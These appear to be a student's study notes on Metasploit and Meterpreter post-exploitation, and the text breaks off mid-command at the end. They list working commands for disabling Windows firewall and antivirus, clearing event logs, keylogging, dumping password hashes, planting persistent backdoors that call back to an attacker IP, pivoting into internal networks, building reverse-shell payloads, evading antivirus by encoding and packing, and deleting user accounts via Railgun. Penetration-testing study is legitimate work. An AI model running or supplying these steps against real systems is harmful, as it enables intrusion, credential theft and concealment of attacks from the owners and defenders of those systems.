# Meterpreter & Post-Exploitation

1. Understanding the victim better (recon)
2. Privilege Escalation (Exploitation)
3. Deleting Logs and Killing Monitoring Software (Post, covering tracks)
4. Collecting Data, Executing programs etc. (recon)
5. Backdoors and Rootkits (post)
6. Using victim as a pivot to hack deeper into the network (exploitation)

### Meterpreter Commands -  post recon

- sysinfo
- getuid
- getpid (current process id)
- ps (see all process)
- idletime (check if user is using the computer by checking their idletime)
- run checkvm (check if the sys is on vm or baremetal, post mt script)
- run get_env (check what environment)
- routes
- ifconfig
- run get_application_list
- run scraper (big info dump to your pc @ msf/logs/scripts/scraper/<IP><datecreated>)
- run winenum (Also info gathering but more on system, like firewall config)

- run (to see what mt posts script you can run)

### 2.PE
example: minishare program has an exploit in metasploit (search it in metasploit)

- getuid
- getsystem -h to learn how to use
- rev2self to revert
- migrate <pid> (after getting privilege, you can migrate to any processes)

### 3.Detecting Logs and shutdown AV

- execute -f cmd.exe -c -H (to get a win cmd, -c to channelize it, -H to hidden from view, remote computer wont come up cmd)
  - interact 1 (talk to channel 1) [Inside win cmd]
  - netsh firewall show opmode (check firewall situation) [Inside win cmd]
  - netsh firewall set opmode mode= DISABLE (disable firewall)
  - netsh firewall show opmode to check again
 
- run killav (kill the antivirus) might not always work
- Lets do it Manually in the target machine
  - now lets do it with a cmd in the machine `execute -f cmd.exe -c -H` `interact 2` (this time it will be on channel 2)
  - `tasklist` to see all ask, avg is what we want to look for which is antivirus
  - `tasklist /SVC` to catergorize them by respondence and look at what is the root of all avg services, /SVC being 'run it along with services hosted by them
  - `tasklist /SVC | find /I "avg"` to see service further down the service tree (all of the service with "avg"), /I being non case sensitive
  - `taskkill /?` to see how to use taskkill, `/?` is like `-h` in linux
  - after that we run `taskkill /F /IM "avg*"`, /F being force, /IM is the Image Name or the process/executable that you want to kill, and we want to kill everything starting with avg with`*` wildcard indicating behind it
  - Nice, let's `tasklist /SVC | find /I "avg"` to see what is still there. And the kill didn't work, it killed some but not the root program started those services again
  - `net stop <service>` to stop specific task, so `net stop avgwd`, and it says it cannot be stopped
  - lets see the attributes of these 2 services `sc queryex avgwd` & `sc queryex AVGIDSAgent`, `sc` is service config manager, `queryex` is query extended, meaning it show more info than `query`
  - It says 'Not stoppable and not pausable, but accepts shutdown', so we can disable it next time when reboot, it is just not stoppable after it booted up
  - `sc config avgwd start= disabled` & `sc config AVGIDSAgent start= disabled`, it should show something like `[SC] ChangeServiceConfig SUCCESS` so it is disabled and now we just need to reboot
- `exit` the win cmd, back to the meterpreter shell. Lets `reboot` the computer
- Let's `exploit` the system again to get back in after it reboot, and `execute -f cmd.exe -c -H` `interact 1` and `tasklist /SVC | find /I "avg"` and the root service isn't there!!!
- Now lets' finally kill the task `taskkill /F /IM "avg*"` and mess with the system!
- Let's mess the log files up so people have no idea whatsup. In meterpreter, run `clearev` to clear event logs

### Stdapi and Priv Extensions, Extensions in Meterpreter

- normal ls and mkdir commands are from the stdapi, and allow us to run these commands in windows or any machine.
- type `?` in meterpreter to view it

- For all keyloggin `keyscan_dump` `keyscan_start` `keyscan_stop` `screenshot`, windows session architecture needs to be understook
  - Windows session is to allow multiple users to log into same computer, however, session 0 is separated for system and critical service, main user is session 0
  - under a session, there are window stations, while multiple stations are possible and there, WinSta0 is the one control desktops, which is the GUI we interact with and most likely use
  - while sessions are run isolate, programs like task managers can reach session 0
  - So the take away is that when running a keylogger, we must be on the same session and same station with the program that is taking in the user input (must be WinSta0, since WinSta0 takes the User Input)
  - So `getdesktop` to see what session and window station we are in
  - `ps` to show all processes, `migrate` to a process you are sure is on a WinSta 0, basically any that has a GUI and interactive
- `Hashdump` for dumping hashes
- `timestomp -h` to see how to modify the time of the file

### espia extension
- same as screengrab, but it does not require to be at WinSta0 like mentioned above

### Sniffer extension
- `use sniffer` and type `?` to learn what it can do
- basically it allow us to do wireshark stuff but from the inside, the exploited machine


### 5.Backdoor & rootkits

2 types: persistence and metsvc

**Persistence**
- persistent backdoorconfigured to connect back on system boot or user login
- creates vbs file on victime and executes it
- although can be uninstalled remotely, needs to delete vbs manually

Commands
- `run persistence -h` for help
- first thing you wanna do is to `run persistence -A -L c:\\ -X -i 10 -p 443 -r<IP>` to start a multi handler to connect back to our machine(-A), (-L) location of vbs, -i 10s for each connection attempt
- use `resource <location of the vbs file(.rc)` to remove it

**metsvc**

- `run metsvc -A` always good to create a multi handler first
- after reboot, we need to manual connect again with `use exploit/multi/handler` and set payload to `windows/metsvc_bind_tcp` and set LHost
- not too good because metsvc is there listening to us since it is bind shell, so anyone who can fine it can connect to it
- `run metsvc -r` to remove it from sys

### 6.Pivoting
Example: broke into DMZ, and we actually want to break in more to the good stuff

- After in DMZ host, check `ipconfig` and see the adapters and see if there is an extra network under it
- `run arp_scanner -r <The extra network IP/24>` to see if it is a proper host on that network
- `background` to go back
- `route add <target network IP> 255.255.255.0 1` route all traffic to <target> network using metasploit session 1
- `route print` to see session routing
- `use auxiliary/scanner/portscan/tcp` to scan all posts, since nmap wont be able to get there, if there is port open, we can use `netapi exploit`
- `use netapi` and `set RHOST`
- **remember the payload has to be bind in this case, because the machine is on a subnet, it would not know our address (attacker machine)**

### 6.Pivoting - port forwarding

Goal: To set up a port @server2 which locates at secure zone, only reachable by server1 which is in DMZ

Workflow
1. Break into server 1 like we did above
2. Set up a local listen on his machine which would then talk to server 1
3. As Meterpreter required, the port listening to Server 1 will be forwarded to server 2

Commands after exploiting server 1:
- `route add 10.10.10.10 255.255.255.0 3` route meterpreter session to server 2
- `use <metasploit scanner module>` confirm port 80 is open on server 2
- `portfwd -h` to see how to use it
- `portfwd add -l <anyPort> -p 80 -r <server 2 IP: 10.10.10.20>` -p is the remote port (server 2 port 80)
- `portfwd list` to list all the posts connected
- Now we just need to use a webbrowser and point it to `localhost:port that we set up`

### Client side browser base attacks
Intro: today's world OS are very secure and patched frequently, however, browser isn't so we can use metasploit to scan and exploit a web browser `browser_autopwn`


1. Set up an attack server with a lot of browser based exploits, when client accidentally click on a link that visit the server then we will be in
2. `use auxiliary/server/browser_autopwn`
3. after server has set up, it is cooperated with phishing or dns poisoning or other web base attacks. When victim clicks on the link or visit our IP, a meterpreter session is opened
4. `sessions -l` to check sessions and `sessions -i <sesionID>` to connect
5. `getuid` & `sysinfo` and perform normal activities


## MSFVenom Payload summary

- Converting payload to .exe, we will need to know what is required,type `msfpayload windows/meterpreter/reverse_tcp S` to see that
- `msfpayload windows/meterpreter/reverse_tcp LHOST=<IP> X > <name of payload>`
- Deliver the payload to target machine (any ways, `python -m http.server` and wget on machine
- set up handler on our box (attack machine) and wait for connection



**msfencode**

Use to Encode msfpayload
- | `msfencode -t exe -x /root/notepad.exe -c 10 -o <name.exe>` -t=specifies the output format, -x=specifies the template file(In this case, it uses an existing executable `/root/notepad.exe` to act as a host for the malicious payload, -c=encode 10 times, -o=output name
- send the payload to target
- use `-k` flag to maintain the functionality of the original executable (notepad.exe)
- `UPS` to compress .exe,.dll,.elf etc. Same as `zip` but designed for executables (sometimes, if we compressed it, the AV will not detect it)
- another way is to change the encode times
- ideally write your own encoders and decode it in target box memory

## Exploit Research
- Art and science of how to write exploits
- Vast in scope:
  - Different operating systems
  - Different protections
  - Varied techniques for exploitation
- Metasploit is typically used in conjunction with tools like ollydbg, immunity Dbg etc.


### Railgun
- A meterpreter extension to load and run code from any DLL present on the target machine
- Find different windows api using railgun

Commands after compromise
- `irb`, it should return `The 'client' variable holds the meterpreter client
- `client.railgun.<the dll you want to call>`
- `client.railgun.user32.LockWorkStation()`

Lets delete a user account
- `irb`
- `client.railgun.netapi32.NetUserDel(nil, <"user AC name">)`
- NetAPI32.dll is a dynamic link library (DLL) file on Windows 10 and 11 that's used for network-related tasks: managing network connections, accessing shared resources, and handling user authentication

**Takeaway**
- all about finding interesting APIs
- one can write full program logic using multiple APIs within apost exploitation modulte or just via the IRB in meterpreter using railgun

### Railgun adding functions
so railgun has a log of cool functions like the above that we used, however, it might not have all that we need, so it allow us to add our own
You can add a custom function on the fly during compromising in meterpreter
- `client.railgun.add_function('netapi32','NetUserChangePassword', 'DWORD', [["PWCHAR","domainname","in"],["PWCHAR","username","in"],["PWCHAR","oldpassword","in"],["PWCHAR","newpassword","in"]])
- first Arg is name of the dll, here is netapi32
- sec arg is function we want to add, NetUserChangePassword
- third arg is the output of the function
- from forth to last wihtin the `[]`, is the arg that the function takes in, in this case NetUserChangePassword
- ["PWCHAR"] = datatype (not sure if this is correct)
- ["username"] = name of the arg
- ["in"] = direction of the argument

### Railgun Adding New DLLs 
- Generally not a good idea to add on the fly
- first question is how are we gonna know all the existing dlls?
- Run `clent.railgun.known_dll_names` after `irb`
- `use clent.railgun.add_dll("<nameOfDll>", "<pathOfDll>", 
